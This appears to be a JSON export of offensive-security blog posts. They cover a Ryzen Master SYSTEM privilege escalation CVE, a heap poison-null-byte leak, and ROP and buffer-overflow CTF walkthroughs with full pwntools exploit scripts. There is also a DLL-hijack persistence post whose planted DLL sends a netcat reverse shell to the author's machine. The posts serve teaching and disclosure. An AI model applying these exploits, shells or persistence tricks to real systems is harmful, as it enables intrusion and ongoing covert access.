[ { "title": "CVE-2022-27677 - Low-hanging SYSTEM shells", "url": "/posts/CVE-2022-27677/", "categories": "Research, Windows", "tags": "windows, cve, privilege-escalation", "date": "2023-02-20 12:00:00 +0000", "snippet": "As an enthusiast for all things offensive security for the last almost two years, I decided it was high time I stopped readingabout other people’s interesting CVEs and instead go and find my own. When choosing a target I decided I wanted it to be in anapplication I actually used, not a XSS in some obscure piece of software somewhere in the depths of the internet. As a big fanof the Ryzen line of CPUs and occasional overclocker, I saw Ryzen Master sitting on my file system and decided to get to work.Something I was not expecting however, was articles coming out on the bug after its disclosure from the likes of DigitalTrendsand Tom’s Hardware among others.These publications don’t focus exclusively on security and so the nature of certain particular bugs might not be fully understoodby their readers and in turn, might cause a bit of a panic to other users of Ryzen Master learning about a vulnerability withinsoftware installed on their PC.For this reason, I’ve decided to write this up in a manner accessible to all audiences to understand exactly what’s happening here.If you aren’t interested in the detail, here’s the long story short:In cases where Ryzen Master is installed within a folder that has insecure permissions, the Ryzen Master folder inherits thosepermissions leaving the contents within vulnerable to being overwritten and tampered with by a low-privileged user. In order forthis bug to be exploited, your system must have already been compromised by an attacker. This bug simply allows them to escalateto a user even more powerful than the system’s administrator.For everyone else, here is CVE-2022-27677.DiscoveryGoing into this, it’s hard to shake the assumption that the easy, low-hanging bugs are all gone depsite knowing this isn’t the case.Anyway, I decided to begin by capturing the install / uninstall flow using ProcMon, particularly what the NT AUTHORITY\\SYSTEMuser is doing during this process considering it was privilege escalation I was after. The NT AUTHORITY\\SYSTEM user is presenton all Windows machines and is reserved by Windows to conduct high-privilege operations on the machine. This SYSTEM user isthe most powerful user in the Windows userland second only maybe to NT Service\\TrustedInstaller and so it is a good targetto try and escalate to.By default, Ryzen Master will install to C:\\Program Files\\AMD\\RyzenMaster.Default Install LocationBy following through with the installer in its default configuration, this was my first encounter with DriverUtility.bat, watching it zip past the ProcMon feed as it was briefly interacted with, among other things by the SYSTEM user.In Windows, a .bat file is simply a list of CMD commands which, when run, will all execute sequentially. In this instance,the .bat file was executed by the SYSTEM user meaning those commands are all running with the permissions afforded to them bythat user.I decided to check the installed folder permissions to see if tampering was possible. If I could edit that .bat file, I could decidewhat commands I wanted the SYSTEM user to run, effectively making me that user. The catch is in order for it to be a validvulnerability, I not only need to tamper with it, but I need to tamper with it as a low-privileged user, hence the name “Privilege Escalation”.Inherited PermissionsThe only group our low-privileged user falls into here is Users which have Read &amp;amp; execute permissions. No good for tampering.This does however mention that these permissions are simply inherited from its parent folder C:\\Program Files. During installation,Ryzen Master allows the user to choose a custom install path. I can’t imagine it’ll still inherit permissions from that secure locationif it is no longer installed within it. I uninstalled Ryzen Master and started back up the installer except this time, I wasgoing to make a change.Custom Install LocationTo my knowledge, this location could be anywhere a low-privileged user would have write access to. C:\\ was just the obviouschoice because the Authenticated Users group has Modify permissions there for Subfolders and files only which is just enoughfor us to make some changes. Ryzen Master goes through its normal install flow, again watching the SYSTEM user interact withDriverUtility.bat.Process MonitorThere are of course other .bat files being interacted with here, but I only needed the one.Once the installation was complete, I again went to check the permissions on my newest installationModifyThere it is, the custom installation inherits its folder’s permissions from an insecure location leaving its contents vulnerable.ExploitationNow that we have the means to overwrite the file, it’s as easy as verifying we have execution as the NT AUTHORITY\\SYSTEM user. A simple PoC I went with is writing the output of whoami to a file. Ryzen Master executes DriverUtility.bat on three occasions (that I know about): It executes on install, uninstall, and update.whoamiNow, upon the uninstallation of Ryzen Master, the contents of DriverUtility.bat should be executed as NT AUTHORITY\\SYSTEMand as proof here is the resulting text file generated by my overwritten command.NT AUTHORITY\\SYSTEMThe impact here is pretty clear, complete command-line access to the machine as one of the most powerful users on Windows,backdoor accounts can be created, private information can be accessed and exfiltrated, but just for fun we can leverage netcat to send a SYSTEM shell to a remote machine for a more interactive method of leveraging our new-found power over the machine.SYSTEM ShellThere it is. That’s the bug. There’s no flashy ROP chains or memory corruption, there’s no high-octane exploitation of the CPU itself, it’s a simple Windows Privilege Escalation bug caused by Ryzen Master trusting insecure directories and inheriting theirpermissions while having critical installation files inside.Get the most up-to-date Ryzen Master build from here:)" }, { "title": "Poison Null Byte - Forging a LIBC Leak", "url": "/posts/Poison-Null-Byte-Forging-A-LIBC-Leak/", "categories": "Research, Exploits", "tags": "exploit, python, pwntools, heap-overflow", "date": "2022-11-25 12:00:00 +0000", "snippet": "I’ve been doing a lot of work recently on learning the heap and the techniques leveraged to exploit it through HeapLAB by Max Kamper. Particularly the heap as it pertains to Linux with GLIBC. One such technique is known as the Poison Null Byte.The Poison Null Byte is a technique in which a heap overflow of just a single byteallows for the manipulation of heap metadata and ultimately, enables the potential to leaksensitive memory addresses such as that of either GLIBC’s base or a heap address, both of whichare subject to ASLR and randomized at run-time; they are different on every execution. Hard-codingvalues subject to ASLR into exploits will not work, they must be resolved at run-time.This is where the leak comes in. By forcing a binary to disclose an address while it’s running,that address can be leveraged in further exploitation such as calculating the address for aone_gadget for example.This is where I had the problem of wanting to write about this technique but also not wanting touse a binary from the HeapLAB course considering those are paid course materials, I don’t wantto be showcasing them for free. In the end, I figured that I would just write my own vulnerablebinary and get a little bit more experience working with C.This way, if my binary is written poorly, it’s actually a bug AND a feature. Win/Win1-NoteNote: 1-Note is linked to an old version of GLIBC: libc-2.25.so. The tcache was introduced inlibc-2.26.so and changes the behavior of core mechanisms behind this bug.When writing 1-Note, I wanted to try and make the binary seem benign in its operations. I triedto come up with normal reasons to make it perform the operations I wanted it to perform. Eventually,I canned that idea after realizing there was no real logical justification for making the allocationsI wanted to make without massively over-engineering it for the showcase of a single bug.1-Note is a binary that does exactly what it says on the box. It holds one note. Here is the menu:0) Read note.1) Change note title.2) Change note contents.3) Malloc / Free 0x88.4) Malloc / Free 0xf8 #1.5) Malloc / Free 0xf8 #2.6) Change note author.7) Delete note contents.8) Exit 1-Note. (Seriously, not *that* OneNote.)Aside from oddly specific, ominous malloc and free calls, it seems relatively harmless. You can change thenote’s title, the note’s author and of course the note’s contents, but there is a problem. The inputsto change these data fields suffer from a single byte overflow:case &#39;1&#39;: if(title == NULL){ title = malloc(0x18); } printf(&quot;\\nNew title: &quot;); fgets(title, 0x18+1, stdin); //HERE break;The final character read in by fgets() will be the string’s null terminator: \\0. By filling thechunk with 0x18 bytes of user data, an additional null byte will be appended, overflow and land inthe first byte of the succeeding chunk’s size_field.The size_field is a crucial part of heap metadata. Its role is to tell malloc how far down thisone specific chunk goes. Various flags can be set on it too to give a little bit more context on thecurrent state of the chunk such as if the previous chunk is free with the prev_in_use flag: 0x01.The smallest size a malloc chunk can be is 0x20 (32 bytes). 0x8 (8 bytes) of it is reserved forthe chunk’s size field, the remaining 0x18 (24 bytes) is to be filled with user data.The bottom of the heap contains what is known as the top_chunk. The top_chunk’s job is to providenew chunks with their memory when they’re being allocated. The value of the top_chunk is the size of memory it’s prepared to allocate whenever it’s needed.Here’s what that looks like:Title ChunkIgnore the pink quadword. That belongs to the previous chunk which is not involved. Everythingin the green belongs to the newly allocated title chunk after choosing the 1) Change note title. option.The title chunk is a 0x20 sized chunk and the chunk behind it isn’t free so the prev_in_use (0x01) flag is set. This makes its size_field: 0x21The succeeding blue quadword is actually the top_chunk. By overflowing the title chunk, anadditional null byte is going to overwrite the first byte of the top_chunk:Poison Null ByteAfter filling the title chunk with ‘A’s (0x41), we see the top_chunk now holds 0x20700 insteadof the previous 0x207c1. 0xc1 has been overwritten with 0x00. You’ll notice the final quadwordof title’s user data has turned the same color as the top_chunk. This is because in overwriting thefirst byte of the top_chunk, we actually cleared its prev_in_use flag (0x01). More on this later.It’s probably time to address the purpose of the prev_in_use flag and what it does.Like I said earlier, the prev_in_use flag indicates whether or not the previous chunk is… in use.Malloc needs this information so it can be efficient in how it manages the heap, specifically, freechunks.For example, imagine there are two 0x90-sized chunks:Irrelevant_Previous_Chunk - ALLOCATEDChunk_A - FREE size_field: 0x91Chunk_B - ALLOCATED size_field: 0x90In malloc’s eyes, Chunk_A is a free chunk because Chunk_B’s size_field says so. If Chunk_B isnow freed, malloc will read Chunk_B’s size_field, notice the previous chunk is also free andconsolidate them together into one single free chunk with a size_field of 0x121 (0x90 + 0x90).Note: If a chunk adjacent to the top_chunk is freed, it will immediately be dissolved and the sizewill be added to the top_chunk.How it achieves the consolidation is related to why the final quadword of our title chunk turned the same color as the top_chunk earlier. When a chunk is freed, two main things happen:1: The prev_in_use flag of the succeeding chunk is cleared to reflect the current free chunk.2: The final quadword of the current chunk&#39;s user data gets repurposed as a prev_size field.The prev_size field is simply the size from the same chunk’s size_field copied into the finalquadword of user data minus the flags. That way when consolidating, malloc can simply read the prev_size field of the previous quadword to the current target’s size_field and know how far back to consolidate.That was a lot of prerequisite but it is required to appreciate what happens in this technique.Now, as long as the victim of the overflow has a size_field of at least 0x110, we can makesome modifications to the heap that we shouldn’t be allowed to make. Anything less than a size of 0x100 and we wipe out the size_field altogether, that won’t help.The question is, what now? How does wiping the first byte of a size_field result in the leakof a sensitive address? It has to do with how free chunks are stored and protected. Much like thereasoning behind free chunk consolidation, malloc is all about efficiency. When a chunk is freed,it will be stored in its respective bin.For this binary, it is the UnsortedBin that concerns us. When a chunk is being newly allocated, it will first search the bins to see if it can reuse a previously freed chunk instead of allocating a brand new one from the top_chunk. The UnsortedBin is a doubly linked list that resides in a place called the main_arena. The main_arena is located at a fixed offset from the base of LIBC. The linkingprocess is tricky to describe but essentially it involves a:FD (forward pointer)BK (backward pointer)Important to note, when malloc is accessing a chunk, it points 0x10 bytes before the user data begins.The FD resides in the first quadword of a free chunk’s userdata. The BK resides in the second.I’ll free a chunk and follow the UnsortedBin FD to show how it works:UnsortedBinThe important part to take away is the chunk placed behind the main_arena in the UnsortedBin will always hold the address of the main_arena in its FD. When there is only one chunk in the UnsortedBin, both the FD and BK will point to the main_arena. The main_arena is a good target because although the addresses are randomized, the offsets stay consistent. If we can leak the main_arena address, we can subtract the known offset and get the LIBC base address. There’s just one problem. After the chunk is freed and the main_arena’s address gets written to the chunk, we can no longer read it due to nulling the pointers to free memory after freeing it within the binary:case &#39;7&#39;: if(contents != NULL){ free(contents); contents = NULL; break; }else{ printf(&quot;\\nYour note is already empty.\\n&quot;); break; }If we could read chunks which were freed from within the binary, this technique wouldn’t be leveraged, it would be a simple Use-After-Free bug. This is where the poison null byte comes in.The ExploitThe goal is to read a main_arena address which is written to a chunk by freeing it. The caveatbeing, you can’t read directly from free chunks. So what can we read from? There is only one menuoption for reading memory and it’s option: 0) Read note. Using Pwndbg, it’s easy to see what thatwould look like.By choosing 2) Change note contents. and writing some data to the note, this is what it looks like on the heap.Note ContentsChoosing 0) Read note. now outputs:NoteOk, great. It will read whatever data is written to it. It will also read the other fields which accept input such as the title and the author, although those aren’t important here:case &#39;0&#39;: if(title != NULL){ printf(&quot;\\nTitle: %s\\n&quot;, (char*)title); }else{ printf(&quot;\\nTitle: Untitled\\n&quot;); } if(contents != NULL){ printf(&quot;%s&quot;, (char*)contents); }else{ printf(&quot;Empty Note&quot;); } if(author != NULL){ printf(&quot;\\nAuthor: %s\\n&quot;, (char*)author); }else{ printf(&quot;\\nAuthor: Anonymous\\n&quot;); } break;We’re going to begin exploiting this binary by firstly allocating the chunks which the read option is is looking forso it will actually include them in the read.Use options:1) Change note title.2) Change note contents.3) Malloc / Free 0x88.6) Change note author.Option 4 &amp;amp; 5 have been intentionally ignored for now. There’s some setup to do. As it stands, the contentschunk is size 0x210 with the additional prev_in_use flag making it 0x211.By now choosing option 7) Delete note contents., this will free the contents chunk, linking it into the UnsortedBin and writing the associated FD and BK to its first two quadwords of user data.Now that the contents chunk is free, we can use option 1) Change note title. and fill it to triggerthe poison null byte overflow. It was freed as a 0x210-sized chunk, now it is a free 0x200-sized chunk as aresult of the overflow. This will have its consequences later on, there are 0x10 bytes which are now unaccounted for.There is one more concept to understand before completing this exploit and that is remaindering. Remaindering is simply malloc splitting apart a free chunk so it can service a request for an allocation of a sizesmaller than the chunk being split.For example, if there is a free chunk of size 0x200 sitting in the UnsortedBin and a request is made for a newallocation of size 0x110, the 0x200-sized chunk will be split to allocate a 0x110-sized chunk, the remaining0x90 of the chunk is going to remain in the UnsortedBin so it can be reused in a different request.Now that that’s out of the way, it’s time to recognize what we have in front of us. A 0x200-sized chunk is nowsitting in the UnsortedBin, holding a main_arena address waiting to be remaindered. We cannot read from itbecause we freed it and nulled the pointer we used to have to it. We’re going to have to do something else.Free ContentsAs luck would have it, options 4 &amp;amp; 5 happen to split thatchunk really nicely, 0xf8 will allocate a chunk of size 0x100 which just so happens to be half of the chunkbeing split.We’ll use option 4) Malloc / Free 0xf8 #1. and see what happens to the heap.RemainderedIt’s at this point that I realize there is an unintended way to read the leak that essentially undermines the wholepoint of this binary. Turns out I’m really good at writing vulnerable binaries; surprise features are showing up.Pretending there isn’t an alternative path, we’ll carry on as normal.By this point, the problem has revealed itself on the heap. vis no longer displays the full heap on account of theheap being misaligned. Our remaindered chunk is falling short of the next size_field (chunk generated from Option 3).By pushing that poison null byte earlier and turning a chunk of size 0x210 to that of a 0x200, 0x10 was lost inthe process. That missing 0x10 is what is causing the current misalignment. In order to read the full heap now, we’llhave to use dq mp_.sbrk_base 400 to dump 400 quadwords from the default heap. This works fine, it’s just not color-coded.Here is what’s going on at the bottom of our remaindered chunk currently sitting in the UnsortedBin:MisalignedThat 0x90 at the bottom is actually the 0x88 chunk’s size field which was allocated after we allocated the original 0x210 contents chunk. When we freed that contents chunk, it wrote its prev_size field of 0x210 in its final quadword of user data. Now that we’re missing 0x10 from pushing the poison null byte, the remaindered chunk’s prev_size field has landed 0x10 bytes short. It should be before the succeeding chunk’s size_field. This is a pretty big problem for reasons we’ll see after our next allocation.Using option 5) Malloc / Free 0xf8 #2., we allocate the remaindered chunk and dive into the heap to see what effect it had:Missed prev_in_useAfter allocating the previously remaindered chunk, it’s no longer free. As such, malloc has attempted to flip theprev_in_use flag onto the succeeding chunk’s size_field. For reasons explained above, this flag misses its target.As far as malloc is aware, according to the 0x90 chunk, the previous chunk is still free despite us just havingallocated it. This makes it a candidate for heap consolidation should we choose to free adjacent chunks.By using option 4) Malloc / Free 0xf8 #1., we free the chunk formerly occupied by contents.Now, by using option 3) Malloc / Free 0x88., it frees the 0x90 chunk, the 0x90 chunk notices from its size_fieldthat the previous chunk is also free considering the 0x90 chunk doesn’t have a prev_in_use flag. It reads itsprev_size field to see how far back it can consolidate (0x210). This consolidates everything back up the formercontents chunk, leaving an unallocated chunk of size 0x2a0:0x2a0Like all free chunks linked into the UnsortedBin, this chunk holds the main_arena address of the UnsortedBin.0x2a0 is plenty of room to squeeze in a new contents chunk.By using option 2) Change note contents. and supplying it with no data, we now have a functional contents pointer.By using option 0) Read note., it leaks the address. This address contains non-ascii characters printed as an asciistring. It will not output correctly but it will output. The address can be decoded in an exploit script.LeakedHere is the result of the exploit script. To avoid cluttering up this post, I’ll leave the source code for the binaryand the exploit script here on my GitHub if you’re interested.Exploited:)" }, { "title": "ROPEmporium - Write4", "url": "/posts/ROPEmporium-Write4/", "categories": "Research, Exploits", "tags": "buffer-overflow, rop, exploit, python, pwntools, ropemporium", "date": "2022-10-11 12:00:00 +0000", "snippet": "For this second post about Binary Exploitation, I was originally going to do just one step up from the last one,but then I decided the act of pushing arguments onto the stack for use in a function wasn’t worth a whole post on itsown. So I have ultimately decided to kick it up a few notches and dive right into Write4 from ROPEmporium and hopefullyfill in the blanks as I go.The first post involved overflowing the buffer and overwriting EIP to return to the win() function. This post isgoing to involve Return-Oriented Programming (ROP). To understand ROP, first you need to understand the RET instruction.Return-Oriented ProgrammingIn some traditional beginner pwn challenges, the NX protection mentioned in the previous post will be disabled.This means you can overflow the buffer, drop your shellcode on the stack, jmp esp and you have arbitrary code execution.In cases where NX protection is enabled, you cannot write and execute your own shellcode. This is where ROP comes in.While the stack may not be executable, instructions inside the binary are. ROP is the process of taking instructionswithin the binary and chaining them together in creative ways to achieve your goal. That’s all well and good but howdo you go about chaining these random instructions together?With the RET instruction.Instructions that can be potentially used in ROP Chains are called ROP Gadgets. There is a reason not all instructionsare ROP Gadgets and it is because of the presence (or lack thereof) of the RET instruction.The RET instruction is essentially an alias for POP EIP. When RET is executed, the value at the top of the stackis popped into EIP to continue execution. We are granted full write access to the stack through the initial buffer overflow.We get to control what address gets RET‘d into EIP and through that, we can generate our own chain of instructionsas long as those instructions end in RET.If this isn’t clear now, it will hopefully be clearer seeing it in action.Write4RopEmporium doesn’t provide source code with the challenges but they do give you a good idea of what to do. Write4is a challenge centered on using ROP to write to memory. The goal is to write flag.txt to a writeable memory addressso we can use it as an argument to the print_file() function.In the interest of saving time and not repeating stuff from the first post,the offset to EIP is 44-bytes of junk data. Now we can start looking for ROP Gadgets.Inside the binary’s conveniently named usefulGadgets()function lies a gadget we can use to write to memory.usefulGadgetThis gadget allows us to move the value stored in the EBP register to the address referenced by EDI. To make use ofthis gadget, we’re going to need a POP EBP gadget, a POP EDI gadget and finally a writeable address in memory, noneof which were particularly hard to find. Using ropper, I found a single gadget that’ll handle both necessary POPoperations.pop edi; pop ebp; ret;Using readelf to view sections of the binary, I found .data is writable and is 8-bytes in size at address 0x0804a018.It’s the perfect size to fit flag.txt which is also 8-bytes. PIE is disabled so the address shown will work fine..dataThere is one small catch. 32-bit memory addresses are just that, 32-bit. Each one can only hold 4-bytes. This meansin order to fit the full flag.txt in there, we’re going to need to perform two writes: one with flag, the other with .txt.There is one final thing to do before we can get writing an exploit. We need the address of the print_file() function.It can be found inside usefulFunction().usefulFunctionNow we have everything we need for an exploit.Building an ExploitHere is what we have:Offset to EIP: 44 BytesWriteable Location in Memory: 0x0804a018&quot;POP EDI; POP EBP;&quot; ROP Gadget: 0x080485aa&quot;MOV DWORD PTR [EDI], EBP&quot; ROP Gadget: 0x08048543&quot;print_file&quot; Function: 0x08048538Now we can begin constructing an exploit step-by-step:Excessive commenting used to help follow what’s going on.#!/bin/env python3from pwn import * #Import the Pwntools libraryoffset = 44 #Offset to EIPlocation = 0x0804a018 #Writeable Location in Memorypop_edi_pop_ebp = p32(0x080485aa) #&quot;POP EDI; POP EBP;&quot; ROP Gadget packed by Pwntoolsmov_ptr_edi_ebp = p32(0x08048543) #&quot;MOV DWORD PTR [EDI], EBP&quot; ROP Gadget packed by Pwntoolsprint_file = p32(0x08048538) #&quot;print_file&quot; Function packed by Pwntoolspayload = b&#39;A&#39; * offset #Generates 44-bytes of junk datapayload += pop_edi_pop_ebp #EIP is set to our first gadget to kick off the chain, it will pop off the next two items on the stack.payload += p32(location) #Writeable Location will be popped by the previous gadget into EDIpayload += b&quot;flag&quot; #&quot;flag&quot; will be popped by the previous gadget into EBPpayload += mov_ptr_edi_ebp #First RET lands here, the value in EBP (flag) will be written to the address referenced by EDI (Writeable Location)#First write complete, &quot;flag&quot; is written to memory.#In the second write, location will be offset by 4-bytes so as not to overwrite &quot;flag&quot;payload += pop_edi_pop_ebp #Second RET lands here, this gadget will pop off the next two items on the stack.payload += p32(location+0x4) #Writeable Location will be popped by the previous gadget into EDI, offset by 4 bytes to complete the write.payload += b&quot;.txt&quot; #&quot;.txt&quot; will be popped by the previous gadget into EBPpayload += mov_ptr_edi_ebp #Third RET lands here, the value in EBP (.txt) will be written to the address referenced by EDI (Writeable Location+0x4)#Second write complete, &quot;flag.txt&quot; is written to memory at address: 0x0804a018#Time to call print_file() and supply location as an argument.payload += print_file #Fourth RET lands here, call print_filepayload += p32(location) #flag.txt supplied as argument to print_file#Call Pwntools to run the binary and execute the exploit.p = process(&quot;./write432&quot;) #Start local processp.sendlineafter(b&quot;&amp;gt; &quot;, payload) #Send the crafted payloadp.interactive() #Receive all dataExploit:)" }, { "title": "Basic Buffer Overflows", "url": "/posts/Basic-Buffer-Overflows/", "categories": "Research, Exploits", "tags": "buffer-overflow, exploit, python, pwntools, picoctf", "date": "2022-09-01 20:00:00 +0000", "snippet": "Binary exploitation has always interested me. Anything low-level does. You always hear about ROPs and NOPs, Overflows and Shellcode.It’s definitely a very exciting and rewarding skill to learn. Like with all things, but especially low-level things; you have to startsmall. For binary exploitation, that means beginning with the humble Buffer Overflow.With this post, I’ll be attempting to create the resource I wish I had stumbled upon when I was first getting started.That said, it’s important to note that I’m still relatively new to all of this, I can’t do anything much more exciting than reliablyexploiting buffer overflows. Fortunately, that’s all this post is going to be about.The target for this post is Buffer Overflow 1 from PicoCTFBuffer Overflow 1For this challenge, we’re supplied with two things; the ELF binary and the source code.There’s a few things we need to check in no particular order so we can begin by simply running the binary like normal../vulnWe’re prompted for input and the binary jumps to 0x804932f where it can continue and complete normal execution.Our second stop is going to be running checksec from pwntools on the binary in order to see what security features are enabled.checksecThis a very simple buffer overflow and so naturally there aren’t any meaningful security protections involved this time around. For the sake ofcompletion, we can define them and what they mean anyway.Arch: i386-32-little Architecture: 32-bit, Little-Endian.RELRO: Partial RELRO Makes the Global Offset Table (GOT) Read-Only.Stack: No canary found Places a random value in the stack, if the value is overwritten, the binary exits.NX: NX disabled Marks the stack as No eXecute meaning no instructions inside will be executed by the CPU.PIE: No PIE (0x8048000) The base address of the binary is randomized. Exploits require addresses to be leaked.RWX: Has RWX segments The binary has segments which are writable and executable.Now that that’s out of the way, we can look at the provided vuln.c source code and get an idea of what’s going on.Source CodemainInside main, there’s some setup presumably for the binary running remotely on PicoCTF. vuln is what we’re interested in.vulnA buffer is created and then gets is called to enter our input into the newly created buffer. After looking up the man pagefor it, it turns out gets is more than a little unsafe.getsHere is where the Buffer Overflow name comes from. gets does not care about the size of the bufferprovided to it; it will store input exceeding that buffer, overflowing and overwriting other data on the stack. At the topof the source code, the buffer size is defined at 32 bytes. Anything in excess of that will overflow the buffer and overwriteadjacent data.Buffer SizeThat seems to be it, after the dangerous call to gets, the binary seems like it’s finished despite there being one more functionpresent in the source code which is never called… The win function.winLooks like this is the function that will read out the flag. It is never called during regular execution. The story so far is:We have a binary that accepts user input,Passes it to a function known to overflow buffers,We are told the return address (which wouldn’t change during regular execution),The binary exits.This paints a good picture as to what is expected of us.Now that we have all the information required to attempt an exploit, we can fire up a debugger (in my case pwndbg) and see what’s going on. We know from reading the source code that the vuln function is where we should be looking.disass vulnWe can assume that we’re supposed to overflow the buffer and overwrite the mentioned instruction pointer (EIP). In orderto know where to place a breakpoint to get a better look, we need to understand how EIP works in the context of functions. EIP and Stack FramesEIP is known as the instruction pointer; its job is to keep track of what address to execute instructions at next. During functioncalls, we enter what is known as a new stack frame where all the instructions for that function reside. But when that functionis finished execution, we need to know what instruction to execute next. For this reason, the old instruction pointer is saved tothe stack just below the newly allocated stack frame. Once the function is finished, we leave the stack frame, collect our oldinstruction pointer and jump back to the place the function was initially called from and continue on regular execution.In conclusion, if you can overwrite data on the stack while inside a function and consequentially overwrite the instruction pointer;you get to control where the binary jumps after said function is finished executing. This will become clearer later if it isn’t clearright now.DebuggingWe now know that our old instruction pointer is vulnerable on the stack and it is restored as we leave the current function’sstack frame. For this reason, we can put a breakpoint on the leave instruction inside vuln. Looking at the screenshot above,that is located at 0x080492c2, we can set a breakpoint run the binary and take a look at what we’re working with.BreakpointI entered in “Win!” as my input in this caseStackHere is what the stack looks like just before we leave the vuln function. There are two important things to take note of here.We have our user input sitting at the very top of the stack and we have our old instruction pointer saved at the bottom. (of the screenshot, this isn’t actually the bottom of the stack.) info frame confirms this address as our “saved EIP”.With the source code, we know our buffer size is 32 bytes; let’s fill it.Full BufferThere it is, perfectly handled inside its buffer, storing 4 bytes per address. 0xffffcfc0 and 0xffffcfc4 are occupied with other unrelated binary data. Time to throw caution to the wind and overflow this buffer with 8 more bytes to overwrite thosetwo mentioned addresses just to get a visual representation of what’s happening here.OverflowWe have now proven we can break out of the buffer and overwrite adjacent data on the stack. We’re really close to reaching thatsaved instruction pointer. We can add another 4 bytes to close the gap and the next 4 bytes we enter after that will overwritethe instruction pointer.To be conclusive on the numbers; the buffer is 32 bytes, then there’s 3 more addresses (12 bytes) we need to overwrite to reachthe instruction pointer. We need to supply 44 bytes of junk data and the next 4 bytes will be our new instruction pointer.Segmentation FaultThe binary confirms the instruction pointer was overwritten and crashes trying to access 0x45444342 (“BCDE” in Little Endian).The final step is to supply the binary with the bytes required to construct the address to the win function.This is probably best done through a Python script considering the bytes we are required to supply aren’t exactly input we cannormally provide with a keyboard.To achieve this, we can use pwntools and the pack function from struct.#!/bin/env python3from pwn import *from struct import pack# Pack will take the given address and morph it into a bytes# &quot;&amp;lt;i&quot; means Little-Endian Integerwin = pack(&quot;&amp;lt;i&quot;, 0x080491f6)# Amount of junk data required to reach instruction pointeroffset = 44#Payloads for binaries must be supplied as bytes (b&quot;A&quot;)payload = b&quot;A&quot; * offset + win# Pwntools will start the local processp = process(&quot;./vuln&quot;)# Go through the binary until the input sectionp.recvuntil(b&quot;&quot;)# Send our offset + win addressp.sendline(payload)# Easy way to receive all further data from the binaryp.interactive()WonWe conclusively enter the win function evident by the reading of flag.txt. As far as Buffer Overflows go, this one cannotbe easier. There are a few more obstacles that may manifest themselves in other situations. The purpose of this binary and of thispost is to understand the fundamental principles of how this attack vector exists and how you can exploit it.:)" }, { "title": "Persistence with DLL Hijacking", "url": "/posts/Persistence-With-DLL-Hijacking/", "categories": "Research, Windows", "tags": "persistence, dll-hijacking", "date": "2022-07-23 12:00:00 +0000", "snippet": "Recently I’ve been playing around with Procmon from SysInternals to try and find interesting DLL Hijacking opportunities.While exploring different software and seeing what would fall into my Procmon filter, I decided that I wanted to write about itand take a break from more or less exclusively writing up HackTheBox machines and instead write up something I’m actively looking into.I found a particularly interesting hijack that has NO security implications (probably) but I thought it would make a great example to show this off.That said, I should clarify this is something I’m actively looking into and learning about. There may be things I leave out or there may be things I get wrong. This is all for fun, seeing where things go and loosely how they work.What is DLL Hijacking?DLL Hijacking is essentially tricking a process to run a malicious DLL file over the legitimate one it’s looking for. It can potentially bea privilege escalation vector if you can get a high privilege process to load your DLL from a low privilege account or it can be usedto maintain persistence on a machine.Typically what it comes down to is having write permissions for a folder containing a DLL loaded by a target process.What DLLs are being loaded?Using a tool called Procmon from SysInternals, you are shown events created by processes running on your system. Included in these events are processes creating handles into DLLs to load. Using Procmon’s filters, it is very easy to specifically capture the loading of DLLs.It’s good to know what DLLs are being loaded, you might get lucky with weak folder permissions, but it’s far more interesting looking into DLLs that are missing. DLLs turning up missing could potentially be a sign that the process is turning to the DLL Search Orderto be loaded. This offers a much more likely chance that it can be hijacked so it is worth filtering for this first.Procmon FilterWith this filter in place, we can load up whatever process we want and capture it trying to load a non-existent DLL.I let this filter run in the background while playing around with different processes and I went back to look through it and found somethingthat caught my eye.BraveC:\\Program Files (x86)\\BraveSoftware\\Update\\goopdate.dllThis is also a good place to say it’s probably not a good idea to specifically filter by process name. Had I specifically filtered forbrave.exe I would have missed this. It initially looks exciting but here’s why I prefaced the post by saying there is NO securityimplications. The folder is protected, you need administrator permissions to write to it and if you already have administrator, thereisn’t a whole lot to escalate to. (Not to mention I couldn’t get it to execute as SYSTEM in the end anyway but that’s beside the point.)Administrator RequiredRead/ExecuteLow-privileged users are only permitted to read the folder and execute files within it.Who’d have known, one of the most popular browsers out there doesn’t have a low-hanging fruit privilege escalation vector… but whatcan we do with it? Had this been a privilege escalation vector, what would it enable us to do? We can build some of our own DLLs andfind out. I found that visiting brave://settings/help in the Brave browser triggers the search for the missing DLL so it’s an easyway to test things out. We can start off by checking if it’ll even execute what we write in our DLL.calc.exeGood thing WinExec() is as straight forward as it is or I’d be on StackOverflow for the foreseeable future. We can build that DLL,quietly grant ourselves the permissions required to write to the folder and place it in there named goopdate.dll just like it waslooking for in Procmon. With the DLL planted, we can navigate to brave://settings/help in the Brave browser and…SuccessWe can generate DLLs to do pretty much whatever we want. Anything we execute within our DLLs will be executed with the permissions Braveis running with, in this specific context we can’t execute anything with a DLL we couldn’t execute ourselves but if this was a processrunning with higher privileges we could run DLLs with, it’s an easy privilege escalation vector.Running as Current UserPersistenceThinking about stuff to do with it, I decided to see how it would work out as a persistence mechanism. I wrote a new DLL to send a shellover Netcat to my Kali machine.ncat.exeSure enough, I replaced the target DLL with my new one, reloaded the trigger on Brave and the shell arrived without a problem.Shell ReceivedGreat, so every time that specific page in the depth of Brave’s settings is loaded, I’ll catch a shell. Not a great mechanism yet.After looking back at the Procmon capture that inititally showed this missing DLL, it seems like BraveUpdateBroker.exe is responsiblefor kicking off the search for the missing DLL. That page doesn’t necessarily have to be visited, BraveUpdateBroker.exe just needs to run.Being an updater, it doesn’t seem like it’d be too out of place being a startup application or a scheduled task, at least compared tofinding TotallyNotMalware.exe as a startup application or a scheduled task. After all, BraveUpdateBroker.exe does have a valid signature.Valid SignatureI decided to plant it in the startup folder as a shortcut.StartupI started a listener on my Kali machine, logged out of Windows and logged back in and sure enough, the shell arrived.PersistenceJust to reiterate, none of this is possible without already having administrator permissions, I just thought it was a fun train of thoughtto explore and write about what would be possible had there been a genuine privilege escalation vector available.:)" }, { "title": "HackTheBox - Cascade", "url": "/posts/HackTheBox-Cascade/", "categories": "HackTheBox, Machines", "tags": "hackthebox, cascade, ldap, active_directory, rpc, smb, evil-winrm, vnc, reversing, cryptography", "date": "2022-06-02 23:00:00 +0000", "snippet": "HackTheBox CascadeCascade is a retired medium Active Directory machine on HackTheBox.EnumerationLike usual, we can start out by enumerating all the ports and do a more thorough scan of existing ports afterwards.Scan:sudo nmap -sS -sC -sV -Pn -vv -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170 -oN nmap/nmap_initial 10.10.10.182Results:Nmap scan report for 10.10.10.182Host is up, received user-set (0.035s latency).Scanned at 2022-06-02 18:59:05 IST for 95sPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) 